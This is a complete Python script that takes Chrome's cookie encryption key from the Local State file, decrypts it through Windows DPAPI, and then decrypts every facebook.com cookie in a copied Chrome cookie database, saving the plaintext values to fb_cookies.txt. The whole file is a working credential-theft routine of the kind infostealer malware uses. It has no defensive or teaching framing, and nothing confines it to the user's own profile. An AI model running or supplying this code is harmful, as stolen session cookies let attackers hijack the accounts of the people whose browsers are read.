import os
import sqlite3
import json
import base64
import win32crypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Get the AES key from Local State
local_state_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Local State')
with open(local_state_path, 'r', encoding='utf-8') as f:
    local_state = json.load(f)
encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
encrypted_key = encrypted_key[5:]
aes_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

# Connect to the copied cookies database
db_path = r"C:\Users\megat\TempChromeUserData\Cookies_temp"
conn = sqlite3.connect(db_path)
cursor = conn.cursor()

cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com'")
cookies = []
for host_key, name, value, encrypted_value in cursor.fetchall():
    if not value:
        if encrypted_value[:3] in (b'v10', b'v11'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:]
            aesgcm = AESGCM(aes_key)
            try:
                decrypted_value = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
                cookies.append(f"{name}={decrypted_value}; Domain={host_key}")
            except Exception as e:
                print(f"Failed to decrypt cookie {name}: {e}")
        else:
            try:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
                cookies.append(f"{name}={decrypted_value}; Domain={host_key}")
            except Exception as e:
                print(f"Failed to decrypt old cookie {name}: {e}")
    else:
        cookies.append(f"{name}={value}; Domain={host_key}")

conn.close()

with open("fb_cookies.txt", "w", encoding='utf-8') as f:
    for c in cookies:
        f.write(c + "\n")

print(f"Successfully extracted {len(cookies)} Facebook cookies.")
